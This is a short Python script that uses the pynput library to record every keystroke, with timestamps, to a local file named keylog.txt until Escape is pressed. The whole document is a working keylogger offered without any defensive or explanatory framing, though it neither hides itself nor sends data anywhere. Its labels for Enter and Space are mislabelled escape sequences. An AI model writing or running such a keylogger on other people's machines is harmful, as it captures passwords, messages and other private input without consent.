from pynput.keyboard import Listener,Key
import logging
logfile='keylog.txt'
logging.basicConfig(filename=logfile,level=logging .DEBUG,format='%(asctime)s : %(message)s')
def onpress(key):
    if hasattr(key, 'char') and key.char:
        logging.info(key.char)
    else:
        if key==Key.enter:
            logging.info('/n')
        elif key==Key.space:
            logging.info('/r')
        elif key==Key.tab:
            logging.info('/t')
        elif key==Key.backspace or key==Key.ctrl_l or key==Key.ctrl_r or key==Key.shift:
            logging.info(key)
        elif key==Key.esc:
            return False
with Listener(on_press=onpress) as listener:
    listener.join()
        
    
        
        
        


